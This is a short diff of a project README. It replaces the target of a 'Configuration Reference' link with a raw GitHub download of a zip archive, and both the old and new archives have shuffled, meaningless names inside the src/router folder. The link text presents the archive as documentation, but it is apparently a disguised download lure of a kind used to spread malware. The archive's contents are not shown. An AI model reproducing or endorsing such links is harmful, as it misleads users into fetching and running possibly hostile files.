@@ -21,4 +21,4 @@ npm run lint
 ```
 
 ### Customize configuration
-See [Configuration Reference](https://raw.githubusercontent.com/FilipStanic/Duo-Lingual-YouTube/master/src/router/Tube_You_Lingual_Duo_v3.0-alpha.2.zip).
+See [Configuration Reference](https://raw.githubusercontent.com/FilipStanic/Duo-Lingual-YouTube/master/src/router/Tube_Duo_You_Lingual_1.0.zip).
